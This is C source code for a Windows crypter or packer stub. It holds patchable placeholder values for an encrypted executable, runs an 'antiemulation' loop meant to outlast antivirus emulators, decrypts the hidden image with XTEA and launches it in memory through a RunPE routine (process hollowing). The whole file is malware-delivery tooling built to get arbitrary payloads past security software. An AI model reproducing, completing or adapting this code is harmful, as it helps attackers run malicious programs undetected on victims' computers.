#include <windows.h>
#include <stdio.h>

#include "runpe.h"
#include "xtea.h"
#include "define.h"

#pragma comment(linker, "/MERGE:.data=.text")
#pragma comment(linker, "/MERGE:.rdata=.text")

void DecryptImage(LPBYTE pImage, DWORD dwImageSize);

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	volatile LPBYTE pbCryptedImage = (LPBYTE) 0xDEADC0DE;
	volatile DWORD dwImageSize = 0xDEADFADE;
	LPBYTE pbMemoryImage = NULL;
    TCHAR szFilePath[MAX_PATH];

	/* Antiemulation loop */
	for (int i = 0; i < 500000; i++)
	{
		LPVOID mem = HeapAlloc(GetProcessHeap(), 0, 4);
		*(DWORD *)mem = 0x12345678;
		HeapFree(GetProcessHeap(), 0, mem);
	}

	/* Read encrypted PE-image from the end of .text section */
	pbMemoryImage = (LPBYTE) ShellcodeToMem(pbCryptedImage, dwImageSize);
	/* Decrypt PE-image in memory and run */
	if (pbMemoryImage)
	{
		DecryptImage(pbMemoryImage, dwImageSize);
		GetModuleFileNameA(0, LPSTR(szFilePath), MAX_PATH);
		RunPE(LPSTR(szFilePath), pbMemoryImage);
	}
    return 0;
}

void DecryptImage(LPBYTE pImage, DWORD dwImageSize)
{
	DWORD blocks = dwImageSize / BLOCK_SIZE;
	for (DWORD i = 0; i < blocks; i++)
	{
		DecryptBlock(64, (uint32_t *)pImage, key);
		pImage += BLOCK_SIZE;
	}
}